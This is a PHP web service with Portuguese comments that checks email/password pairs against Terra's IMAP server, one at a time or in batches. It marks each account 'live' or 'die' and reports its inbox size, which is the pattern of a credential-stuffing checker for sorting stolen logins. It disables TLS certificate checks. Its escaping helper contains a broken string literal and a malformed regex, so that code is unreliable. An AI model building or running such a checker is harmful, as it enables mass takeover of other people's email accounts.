<?php
/**
 * terra_validator_v4.php
 * Validador IMAP via Socket TLS Direto — sem dependência de extensão imap.
 * Compatible com PHP 8.0+ / Render / Apache.
 */
declare(strict_types=1);

error_reporting(E_ALL);
ini_set('display_errors', '0');
ini_set('log_errors', '1');

header('Content-Type: application/json; charset=utf-8');
header('X-Content-Type-Options: nosniff');

class TerraValidator
{
    private array $config;

    public function __construct()
    {
        $this->config = [
            'imap_host'    => getenv('IMAP_HOST') ?: 'imap.terra.com.br',
            'imap_port'    => (int)(getenv('IMAP_PORT') ?: 993),
            'timeout'      => (int)(getenv('IMAP_TIMEOUT') ?: 15),
            'max_retries'  => (int)(getenv('MAX_RETRIES') ?: 2),
        ];
    }

    /* ----------------------------------------------------------------
     *  PUBLIC API
     * ---------------------------------------------------------------- */

    public function validate(string $email, string $password): array
    {
        $email = trim($email);
        $password = (string)$password;

        if ($email === '' || $password === '') {
            return $this->errorResult($email, 'Email ou senha vazios', 'missing_input');
        }

        if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
            return $this->errorResult($email, 'Formato de email inválido', 'invalid_email');
        }

        $attempt      = 0;
        $last_error   = '';
        $start_time   = microtime(true);

        while ($attempt < $this->config['max_retries']) {
            $attempt++;

            try {
                $result = $this->authenticate($email, $password);

                if ($result['status'] === 'live') {
                    $result['elapsed_ms'] = round((microtime(true) - $start_time) * 1000, 2);
                    $result['attempts']   = $attempt;
                    return $result;
                }

                $last_error = $result['message'] ?? 'Erro desconhecido';

                // Credenciais inválidas → não retenta
                if (($result['reason'] ?? '') === 'invalid_credentials') {
                    $result['elapsed_ms'] = round((microtime(true) - $start_time) * 1000, 2);
                    $result['attempts']   = $attempt;
                    return $result;
                }

                // Erro não-recuperável → não retenta
                if (!($result['retryable'] ?? false)) {
                    $result['elapsed_ms'] = round((microtime(true) - $start_time) * 1000, 2);
                    $result['attempts']   = $attempt;
                    return $result;
                }

            } catch (\Throwable $e) {
                $last_error = $e->getMessage();
            }

            // Backoff exponencial: 1s, 2s...
            if ($attempt < $this->config['max_retries']) {
                usleep((int)(pow(2, $attempt - 1) * 1_000_000));
            }
        }

        return [
            'status'      => 'die',
            'email'       => $email,
            'attempts'    => $attempt,
            'last_error'  => $last_error,
            'reason'      => 'max_retries_exceeded',
            'elapsed_ms'  => round((microtime(true) - $start_time) * 1000, 2),
            'timestamp'   => date('Y-m-d H:i:s'),
        ];
    }

    public function validateBatch(array $credentials): array
    {
        $results = [];

        foreach ($credentials as $cred) {
            $email    = $cred['email']    ?? '';
            $password = $cred['password'] ?? '';

            if ($email === '' || $password === '') {
                $results[] = [
                    'email'   => $email,
                    'status'  => 'error',
                    'message' => 'Email ou senha ausentes',
                ];
                continue;
            }

            $results[] = $this->validate($email, $password);
        }

        return [
            'total'     => count($results),
            'live'      => count(array_filter($results, fn($r) => ($r['status'] ?? '') === 'live')),
            'die'       => count(array_filter($results, fn($r) => ($r['status'] ?? '') === 'die')),
            'errors'    => count(array_filter($results, fn($r) => ($r['status'] ?? '') === 'error')),
            'results'   => $results,
            'timestamp' => date('Y-m-d H:i:s'),
        ];
    }

    /* ----------------------------------------------------------------
     *  AUTENTICAÇÃO VIA SOCKET TLS
     * ---------------------------------------------------------------- */

    private function authenticate(string $email, string $password): array
    {
        // 1. Resolver DNS
        $ip = gethostbyname($this->config['imap_host']);
        if ($ip === $this->config['imap_host']) {
            return $this->errorResult(
                $email,
                'Falha na resolução DNS de ' . $this->config['imap_host'],
                'dns_failure',
                true
            );
        }

        // 2. Conectar via socket TCP
        $remote    = sprintf('tls://%s:%d', $this->config['imap_host'], $this->config['imap_port']);
        $errno     = 0;
        $errstr    = '';
        $context   = stream_context_create([
            'ssl' => [
                'verify_peer'       => false,
                'verify_peer_name'  => false,
                'allow_self_signed' => true,
                'min_proto_version' => STREAM_CRYPTO_PROTO_TLSv1_2,
            ],
        ]);

        $socket = @stream_socket_client(
            $remote,
            $errno,
            $errstr,
            (float)$this->config['timeout'],
            STREAM_CLIENT_CONNECT,
            $context
        );

        if ($socket === false) {
            return $this->errorResult(
                $email,
                sprintf('Conexão recusada: [%d] %s', $errno, $errstr),
                'connection_failed',
                true
            );
        }

        stream_set_timeout($socket, $this->config['timeout']);
        stream_set_blocking($socket, true);

        try {
            return $this->imapHandshake($socket, $email, $password);
        } finally {
            if (is_resource($socket)) {
                @fclose($socket);
            }
        }
    }

    /**
     * Executa o protocolo IMAP sobre o socket TLS já conectado.
     */
    private function imapHandshake($socket, string $email, string $password): array
    {
        // 1. Ler greeting do servidor
        $greeting = $this->readLine($socket);
        if ($greeting === null) {
            return $this->errorResult($email, 'Servidor não enviou greeting IMAP', 'no_greeting', true);
        }

        if (stripos($greeting, 'OK') === false) {
            return $this->errorResult(
                $email,
                'Greeting IMAP inválido: ' . trim($greeting),
                'bad_greeting',
                true
            );
        }

        // 2. Comando LOGIN
        $tag     = 'A001';
        $cmd     = sprintf(
            "%s LOGIN %s %s\r\n",
            $tag,
            $this->escapeImapString($email),
            $this->escapeImapString($password)
        );

        $written = @fwrite($socket, $cmd);
        if ($written === false || $written === 0) {
            return $this->errorResult($email, 'Falha ao enviar comando LOGIN', 'write_failed', true);
        }

        // 3. Ler resposta até a tag
        $response = $this->readUntilTag($socket, $tag);
        if ($response === null) {
            return $this->errorResult($email, 'Sem resposta do LOGIN (timeout)', 'login_timeout', true);
        }

        // 4. Analisar resposta
        $pattern = '/' . preg_quote($tag, '/') . '\s+(OK|NO|BAD)/i';
        if (!preg_match($pattern, $response, $m)) {
            return $this->errorResult(
                $email,
                'Resposta IMAP inesperada: ' . substr(trim($response), 0, 200),
                'unexpected_response',
                true
            );
        }

        $code = strtoupper($m[1]);

        if ($code === 'OK') {
            // Login bem-sucedido — tenta SELECT INBOX para contagem
            $num_messages = $this->getInboxCount($socket);

            // Logout limpo
            @fwrite($socket, "A002 LOGOUT\r\n");

            return [
                'status'           => 'live',
                'email'            => $email,
                'message'          => 'Autenticação bem-sucedida',
                'mailbox_messages' => $num_messages,
                'authenticated_at' => date('Y-m-d H:i:s'),
            ];
        }

        // NO ou BAD — credenciais inválidas
        return $this->errorResult(
            $email,
            'Credenciais inválidas',
            'invalid_credentials',
            false,
            substr(trim($response), 0, 300)
        );
    }

    /**
     * Tenta SELECT INBOX e extrai contagem de mensagens.
     */
    private function getInboxCount($socket): int
    {
        $tag = 'B001';

        $written = @fwrite($socket, "{$tag} SELECT INBOX\r\n");
        if ($written === false) {
            return 0;
        }

        $response = $this->readUntilTag($socket, $tag);
        if ($response !== null && preg_match('/(\d+)\s+EXISTS/i', $response, $m)) {
            return (int)$m[1];
        }

        return 0;
    }

    /* ----------------------------------------------------------------
     *  LEITURA DE SOCKET
     * ---------------------------------------------------------------- */

    private function readLine($socket): ?string
    {
        $line = @fgets($socket, 8192);
        return ($line !== false && $line !== '') ? $line : null;
    }

    private function readUntilTag($socket, string $tag): ?string
    {
        $response = '';
        $start    = microtime(true);
        $tag_len  = strlen($tag);

        while (!@feof($socket)) {
            $line = @fgets($socket, 8192);
            if ($line === false) {
                break;
            }

            $response .= $line;

            // Linha tagged: "A001 OK ..." ou "A001 NO ..."
            $trimmed = ltrim($line);
            if (substr($trimmed, 0, $tag_len) === $tag) {
                return $response;
            }

            // Timeout
            $meta = @stream_get_meta_data($socket);
            if (($meta && $meta['timed_out']) || (microtime(true) - $start) > $this->config['timeout']) {
                break;
            }
        }

        return $response !== '' ? $response : null;
    }

    /* ----------------------------------------------------------------
     *  UTILITÁRIOS
     * ---------------------------------------------------------------- */

    /**
     * Escapa string para o protocolo IMAP.
     * Se contiver espaços ou caracteres especiais, envolve entre aspas duplas
     * e escapa aspas e barras invertidas.
     */
    private function escapeImapString(string $value): string
    {
        if ($value === '') {
            return '""';
        }

        // Se não tem caracteres que precisam de aspas, envia literal
        if (!preg_match('/[\s"\x00-\x1F\x7F\\]/', $value)) {
            return $value;
        }

        $escaped = str_replace(['\', '"'], ['\\', '\"'], $value);
        return '"' . $escaped . '"';
    }

    private function errorResult(
        string $email,
        string $message,
        string $reason,
        bool $retryable = false,
        ?string $detail = null
    ): array {
        $result = [
            'status'     => 'die',
            'email'      => $email,
            'message'    => $message,
            'reason'     => $reason,
            'retryable'  => $retryable,
        ];

        if ($detail !== null) {
            $result['error_detail'] = $detail;
        }

        return $result;
    }
}

/* ====================================================================
 *  EXECUÇÃO
 * ==================================================================== */

// Detectar input: POST form, JSON body, ou query string
$input = $_POST;

$content_type = $_SERVER['CONTENT_TYPE'] ?? '';

if (empty($input) && stripos($content_type, 'application/json') !== false) {
    $raw = file_get_contents('php://input');
    if (!empty($raw)) {
        $decoded = json_decode($raw, true);
        if (is_array($decoded)) {
            $input = $decoded;
        }
    }
}

// Fallback: query string em GET (para testes rápidos no navegador)
if (empty($input)) {
    $input = $_GET;
}

$email    = (string)($input['email']    ?? '');
$password = (string)($input['password'] ?? '');
$batch    = $input['batch']             ?? null;

// Rota de health check
if (isset($input['action']) && $input['action'] === 'ping') {
    echo json_encode([
        'status'    => 'ok',
        'service'   => 'terra_validator',
        'version'   => '4.0',
        'php'       => PHP_VERSION,
        'host'      => gethostname(),
        'timestamp' => date('Y-m-d H:i:s'),
    ], JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
    exit;
}

// Rota de diagnóstico
if (isset($input['action']) && $input['action'] === 'diagnose') {
    $validator = new TerraValidator();
    $config    = (new ReflectionClass($validator))->getProperty('config');
    $config->setAccessible(true);
    $cfg = $config->getValue($validator);

    $diag = [
        'php_version'   => PHP_VERSION,
        'host'          => gethostname(),
        'server_ip'     => $_SERVER['SERVER_ADDR'] ?? 'N/A',
        'extensions'    => [
            'openssl'   => extension_loaded('openssl')   ? 'yes' : 'NO',
            'sockets'   => extension_loaded('sockets')   ? 'yes' : 'NO',
            'imap'      => extension_loaded('imap')      ? 'yes' : 'NO',
        ],
        'imap_config'   => [
            'host'       => $cfg['imap_host'],
            'port'       => $cfg['imap_port'],
            'timeout'    => $cfg['timeout'],
            'max_retries'=> $cfg['max_retries'],
        ],
        'dns_check'     => [],
        'connection'    => [],
    ];

    // Teste de DNS
    $ip = @gethostbyname($cfg['imap_host']);
    $diag['dns_check'] = [
        'hostname' => $cfg['imap_host'],
        'resolved' => ($ip !== $cfg['imap_host']) ? $ip : 'FAILED',
    ];

    // Teste de conexão TCP
    $remote  = sprintf('tls://%s:%d', $cfg['imap_host'], $cfg['imap_port']);
    $context = stream_context_create([
        'ssl' => [
            'verify_peer'       => false,
            'verify_peer_name'  => false,
            'allow_self_signed' => true,
        ],
    ]);

    $start = microtime(true);
    $sock  = @stream_socket_client($remote, $errno, $errstr, 10.0, STREAM_CLIENT_CONNECT, $context);
    $elapsed = round((microtime(true) - $start) * 1000, 2);

    if ($sock === false) {
        $diag['connection'] = [
            'status'    => 'FAILED',
            'error'     => $errstr,
            'errno'     => $errno,
            'elapsed_ms'=> $elapsed,
        ];
    } else {
        $greeting = @fgets($sock, 8192);
        $diag['connection'] = [
            'status'     => 'OK',
            'elapsed_ms' => $elapsed,
            'greeting'   => $greeting ? trim($greeting) : 'empty',
        ];
        @fclose($sock);
    }

    echo json_encode($diag, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
    exit;
}

// Modo lote
if ($batch !== null && is_array($batch)) {
    $validator = new TerraValidator();
    echo json_encode($validator->validateBatch($batch), JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
    exit;
}

// Modo simples
if ($email !== '' && $password !== '') {
    $validator = new TerraValidator();
    echo json_encode($validator->validate($email, $password), JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
    exit;
}

// Sem input — mostra ajuda
http_response_code(400);
echo json_encode([
    'error' => 'Credenciais ausentes',
    'usage' => [
        'simple'    => 'POST email=user@terra.com.br&password=senha123',
        'json'      => 'POST {"email":"user@terra.com.br","password":"senha123"}',
        'batch'     => 'POST {"batch":[{"email":"user1@terra.com.br","password":"pass1"},...]}',
        'diagnose'  => 'GET ?action=diagnose',
        'ping'      => 'GET ?action=ping',
    ],
], JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
